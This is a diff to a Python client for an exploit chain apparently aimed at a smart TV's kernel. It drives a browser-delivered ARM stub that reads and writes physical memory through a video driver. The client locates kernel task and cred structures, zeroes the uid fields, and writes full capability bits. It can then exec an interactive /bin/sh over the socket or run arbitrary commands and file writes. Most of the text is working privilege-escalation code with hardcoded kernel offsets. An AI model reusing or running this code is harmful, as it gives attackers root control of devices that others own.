@@ -1,6 +1,7 @@
 """Physmap RPC client: drive the in-renderer ARM stub over the port-80 gateway.
 
-The stub (payloads/pwn_physrpc.js) opens /dev/video40 and speaks:
+The stub is `server/payloads/browser_payload.js` (source `tools/physrpc.S`); it
+opens /dev/video30 and speaks:
    hello : 12 bytes  "PGDB" + prctl_ret + open_ret
    header: op,a,b,c (u32 LE)
      op 0 READ     a=phys page, b=offset, c=len -> c bytes
@@ -8,18 +9,22 @@ The stub (payloads/pwn_physrpc.js) opens /dev/video40 and speaks:
      op 3 EXIT
      op 4 READMANY a=first page, c=count -> per page status(4B)+4096B
      op 5 EXEC     dup2(sock) + execve("/bin/sh","-i")
+     op 6 FORK     -> child pid (landmark for the task-list hunt)
+     op 7 RUN      a=0,b=0,c=len("-c\0"+cmd) -> child pid, then the output
+     op 8 FILE     a=flags(0 trunc/1 append), b=pathlen, c=datalen -> status
 
 Usage (server + TV must be live; connects to 127.0.0.1:9998):
-  python tvphys.py verify            # hello + kernel-image signature check
-  python tvphys.py root2             # locate init by comm, patch cred (no task list)
-  python tvphys.py exec              # after root: replace stub with /bin/sh
-  python tvphys.py dump <phys> <n>   # dump n bytes from a physical address
+  python tools/physmap.py verify            # hello + kernel-image signature check
+  python tools/physmap.py root2             # locate init by comm, patch cred (no task list)
+  python tools/physmap.py exec              # after root: replace stub with /bin/sh
+  python tools/physmap.py dump <phys> <n>   # dump n bytes from a physical address
 
 The old `root` / `rootexec` modes (a task-list walk with a fixed init_task file
 offset) were removed: they called an undefined find_tasks_offset/walk_tasks and
 needed firmware/extracted/uImage, so they could never run from a clone.  Use
 kernel_root.py --fork (the production path), scan_cred.py, or root2 here.
 """
+import os
 import socket
 import struct
 import sys
@@ -27,8 +32,7 @@ import time
 from pathlib import Path
 
 ROOT = Path(__file__).resolve().parent.parent
-import os as _os
-_gw = _os.environ.get("TVPHYS_GATEWAY", "127.0.0.1:9998").split(":")
+_gw = os.environ.get("TVPHYS_GATEWAY", "127.0.0.1:9998").split(":")
 GATEWAY = (_gw[0], int(_gw[1]))
 
 # kernel image facts (uImage payload is a raw uncompressed ARM Image)
@@ -38,11 +42,15 @@ IMAGE_FILE = ROOT / "firmware" / "extracted" / "uImage"
 # 8-byte ARM Image signature of this firmware's kernel (measured).  Kept as a
 # constant so root/deploy works without the extracted uImage being present.
 IMG_SIG = bytes([0xEE, 0x44, 0x00, 0xEB, 0x00, 0x90, 0x0F, 0xE1])
-OFF_INIT_TASK = 0x93D180          # init_task within the Image
-OFF_MODPROBE = 0x943248           # "/sbin/modprobe" within the Image
+DATA_SHIFT = 0x12000                     # running .data vs the shipped Image
+OFF_INIT_TASK = 0x93D180 + DATA_SHIFT    # init_task within the RUNNING Image
+OFF_MODPROBE = 0x943248                  # "/sbin/modprobe" within the Image
 PAGE_OFFSET = 0xC0000000
-RAM_LO = 0x20000000               # managed RAM (QN90B-style PHYS_OFFSET)
-RAM_HI = 0x8E000000               # MemTotal 1.73 GB from 0x20000000; stay below
+RAM_LO = 0x20000000                      # managed RAM (QN90B-style PHYS_OFFSET)
+# Reads past ~0x46000000 have hung this driver family (two full scans died
+# there), so the default is the proven band; the sweeps use it.  TVPHYS_HI=<hex>
+# raises it for a measured experiment only.
+RAM_HI = int(os.environ.get("TVPHYS_HI", hex(0x40000000)), 0)
 
 # task_struct / cred offsets (verified against the Image and open source)
 O_PTRACER_CRED = 0x3F0
@@ -50,7 +58,13 @@ O_REAL_CRED = 0x3F4
 O_CRED = 0x3F8
 O_COMM = 0x400
 CRED_IDS = 8                      # uid..fsgid at cred+4 .. cred+32
+O_CAP_PERMITTED = 48
+O_CAP_EFFECTIVE = 56
+CAP_FULL_LO = 0xFFFFFFFF
+CAP_FULL_HI = 0x3F                # 0x3fffffffff = the 38 caps this kernel has
+OWNER_UID = 5001
 COMM_TAG = b"PHYSRPC1\0"
+LOGS_DIR = ROOT / "server" / "logs"
 
 
 def u32(b, o=0):
@@ -72,8 +86,21 @@ class RPC:
             self.s.close()
             raise TimeoutError(
                 f"no TV stub connected to the gateway within {hello_timeout:g}s")
+        except EOFError:
+            # The gateway sends a short reply (BUSY) or closes when another
+            # client already holds the slot; that used to surface as a bare
+            # "TV closed after 0/12 bytes" traceback.
+            self.s.close()
+            raise TimeoutError(
+                "the RPC gateway refused the pairing (BUSY: another client is "
+                "attached, or the page/stub just reloaded). Retry after "
+                "physmap.reset_stub().")
         self.s.settimeout(timeout)
         self.magic, self.prctl_ret, self.open_ret = struct.unpack("<4sii", hello)
+        if self.magic != b"PGDB":
+            self.s.close()
+            raise RuntimeError(f"unexpected gateway hello {self.magic!r} "
+                               f"(not a physmap stub)")
         print(f"[rpc] hello {self.magic!r} prctl_ret={self.prctl_ret} open_ret={self.open_ret}",
               flush=True)
 
@@ -287,14 +314,28 @@ def walk_for_tag(rpc, init_virt, tasks_off, max_entries=900, verbose=False):
 
 
 
-def patch_cred(rpc, cred_phys, dry=False):
+def patch_ids(rpc, cred_phys, uid_gate=True):
+    """Zero uid..fsgid; True ONLY when this call wrote them.
+
+    The distinction matters: `patch_cred` used to return True for a cred that
+    already read uid 0, and `patch_full` took that as permission to write
+    `cap_permitted`/`cap_effective` - on init's cred, when a stale task pointer
+    led there (review 2026-10-26).  Capability writes only ever follow a write
+    that started from uid 5001.
+    """
     if cred_phys >= 0xC0000000:
         cred_phys = _v2p(cred_phys)
-    ids = rpc.read(cred_phys + 4, CRED_IDS * 4)
-    vals = struct.unpack("<8I", ids)
-    print(f"[*] cred {hexs(cred_phys)} ids = {vals}", flush=True)
-    if dry:
-        return False
+    ids = struct.unpack("<8I", rpc.read(cred_phys + 4, CRED_IDS * 4))
+    print(f"[*] cred {hexs(cred_phys)} ids = {ids}", flush=True)
+    if uid_gate:
+        if ids[0] == 0:
+            print(f"[*] cred {hexs(cred_phys)} already uid 0 - nothing written",
+                  flush=True)
+            return False
+        if ids[0] != OWNER_UID:
+            print(f"[-] skip {hexs(cred_phys)}: uid {ids[0]} is not ours "
+                  f"({OWNER_UID})", flush=True)
+            return False
     for i in range(CRED_IDS):
         st = rpc.write32(cred_phys + 4 + i * 4, 0)
         if st != 0:
@@ -303,6 +344,59 @@ def patch_cred(rpc, cred_phys, dry=False):
     back = struct.unpack("<8I", rpc.read(cred_phys + 4, CRED_IDS * 4))
     print(f"[+] cred after patch = {back}", flush=True)
     return all(v == 0 for v in back)
+
+
+def patch_cred(rpc, cred_phys, dry=False, uid_gate=True):
+    """Back-compat wrapper: True when the cred needs no write (uid 0) or the
+    ids write from 5001 verified.  New code that also writes capabilities must
+    use `patch_ids` so "already done" cannot authorise a cap write.
+    """
+    if cred_phys >= 0xC0000000:
+        cred_phys = _v2p(cred_phys)
+    ids = struct.unpack("<8I", rpc.read(cred_phys + 4, CRED_IDS * 4))
+    if dry:
+        print(f"[*] cred {hexs(cred_phys)} ids = {ids} (dry)", flush=True)
+        return False
+    if uid_gate and ids[0] == 0:
+        print(f"[*] cred {hexs(cred_phys)} already uid 0 - nothing written",
+              flush=True)
+        return True
+    return patch_ids(rpc, cred_phys, uid_gate=uid_gate)
+
+
+def patch_full(rpc, cred, uid_gate=True):
+    """Patch ids AND capabilities, like the payload's PatchCred.
+
+    root2 used to call patch_cred only, which yields uid 0 *without*
+    CAP_DAC_OVERRIDE/CAP_SYS_ADMIN: every "root" check passes and privileged
+    work still fails (review finding #17).  Caps are written ONLY after an ids
+    write that started from uid 5001.
+    """
+    if cred >= 0xC0000000:
+        cred = _v2p(cred)
+    try:
+        uid = rpc.read_u32(cred + 4)
+    except Exception:
+        return False
+    if uid == 0:
+        print(f"[*] cred {hexs(cred)} already uid 0 - caps untouched", flush=True)
+        return False
+    if uid != OWNER_UID:
+        print(f"[-] skip {hexs(cred)}: uid {uid} is not ours ({OWNER_UID})",
+              flush=True)
+        return False
+    if not patch_ids(rpc, cred, uid_gate=uid_gate):
+        return False
+    for off in (O_CAP_PERMITTED, O_CAP_EFFECTIVE):
+        for k, val in ((0, CAP_FULL_LO), (4, CAP_FULL_HI)):
+            st = rpc.write32(cred + off + k, val)
+            if st != 0:
+                print(f"[-] cap write at cred+{off + k} failed: {st}", flush=True)
+                return False
+    perm = int.from_bytes(rpc.read(cred + O_CAP_PERMITTED, 8), "little")
+    eff = int.from_bytes(rpc.read(cred + O_CAP_EFFECTIVE, 8), "little")
+    print(f"[+] cred now cap_permitted={perm:#x} cap_effective={eff:#x}", flush=True)
+    return perm == 0x3FFFFFFFFF and eff == 0x3FFFFFFFFF
 
 
 def _kernel_ptr(v):
@@ -429,7 +523,7 @@ def root_cred_via_tag(rpc, do_exec=False):
             if not _kernel_ptr(cred):
                 print("[-] cred pointer rejected", flush=True)
                 return False
-            ok = patch_cred(rpc, cred)
+            ok = patch_full(rpc, cred)
             if ok:
                 print("[+] uid patch applied; process is now uid 0", flush=True)
                 if do_exec:
@@ -447,7 +541,7 @@ def root_cred_via_tag(rpc, do_exec=False):
     print(f"[*] tag at {hexs(tag_phys)} cred={hexs(cred)}", flush=True)
     if not _kernel_ptr(cred):
         return False
-    ok = patch_cred(rpc, cred)
+    ok = patch_full(rpc, cred)
     if ok and do_exec:
         rpc.exec_shell()
     return ok
@@ -474,20 +568,22 @@ def main():
         elif mode == "dump":
             phys = int(sys.argv[2], 0)
             n = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x100
-            out = Path(sys.argv[4]) if len(sys.argv) > 4 else ROOT / "recon" / "dump.bin"
+            out = Path(sys.argv[4]) if len(sys.argv) > 4 else LOGS_DIR / "dump.bin"
             data = rpc.read(phys, n)
+            out.parent.mkdir(parents=True, exist_ok=True)
             out.write_bytes(data)
             print(f"[+] wrote {len(data)} bytes from {hexs(phys)} -> {out}", flush=True)
         elif mode == "readmany":
             first = int(sys.argv[2], 0)
             count = int(sys.argv[3], 0)
-            out = Path(sys.argv[4]) if len(sys.argv) > 4 else ROOT / "recon" / "dump.bin"
+            out = Path(sys.argv[4]) if len(sys.argv) > 4 else LOGS_DIR / "dump.bin"
             buf = bytearray()
             for page, data in rpc.readmany(first, count):
                 if data is None:
                     print(f"[-] page {hexs(page)} unreadable", flush=True)
                     data = b"\xEE" * 0x1000
                 buf += data
+            out.parent.mkdir(parents=True, exist_ok=True)
             out.write_bytes(bytes(buf))
             print(f"[+] wrote {len(buf)} bytes from {hexs(first)} -> {out}", flush=True)
         else:
